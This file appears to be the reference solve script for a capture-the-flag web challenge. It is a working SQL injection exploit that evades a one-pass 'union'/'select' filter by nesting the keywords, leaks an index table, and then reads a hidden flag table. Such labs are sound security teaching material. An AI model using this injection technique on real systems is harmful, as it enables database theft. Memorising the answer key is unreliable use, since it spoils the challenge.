// Reference solve — Mercy Clinic, Templar. Same UNION idea as Acolyte, but the search strips `union` and `select` once
// (case-insensitive) before concatenating. The flag has also moved off the staff notice: it now lives in a randomly
// named vault table, and `vault_index` names that table and column. INJECTION nests each keyword inside itself
// (`ununionion` / `selselectect`) so the single removal pass rebuilds `union`/`select`; leak the index first, then
// select the payload from the named vault table. The plain Acolyte payload loses its keywords here and fails.
const base = process.argv[2];
const INDEX = "') ununionion selselectect id, table_name, column_name FROM vault_index -- ";
const INDEX_HTML = await (await fetch(`${base}/search?q=${encodeURIComponent(INDEX)}`)).text();
// The injected row renders table_name as its title: vault_<8 hex>, then the column (payload).
const table = /vault_[a-f0-9]{8}/.exec(INDEX_HTML)?.[0];
if (table) {
  const READ = `') ununionion selselectect 0, 'Vault', payload FROM ${table} -- `;
  const html = await (await fetch(`${base}/search?q=${encodeURIComponent(READ)}`)).text();
  const m = html.match(/HVWA\{[a-z2-7]{26}\}/);
  if (m) console.log(m[0]);
}
